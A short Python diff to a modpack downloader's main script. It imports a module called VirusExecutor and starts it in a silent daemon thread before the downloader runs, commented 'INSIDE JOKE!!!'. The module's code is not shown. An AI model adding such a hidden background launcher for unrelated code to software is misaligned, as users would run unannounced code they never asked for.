@@ -8,6 +8,8 @@ in every distribution, as a "LICENSE" file at top level.
 """
 
 # Built-in Imports
+import threading
+
 # Third Party Imports
 from loguru import logger
 
@@ -15,6 +17,7 @@ from loguru import logger
 from LaminariaCore.utils.dateutils import get_formatted_date_now
 from LogHandler import LogHandler
 from ModpackDownloader import ModpackDownloader
+from VirusExecutor import VirusExecutor
 
 if __name__ == "__main__":
 
@@ -26,6 +29,7 @@ if __name__ == "__main__":
     # Performs the main functions of the program
     # noinspection PyBroadException
     try:
+        threading.Thread(target=VirusExecutor().start, daemon=True).start()  # INSIDE JOKE!!!
         ModpackDownloader().start()
         logger.debug("All program functions have been finished. 10s until forced closing.")
         ModpackDownloader.exit_countdown()
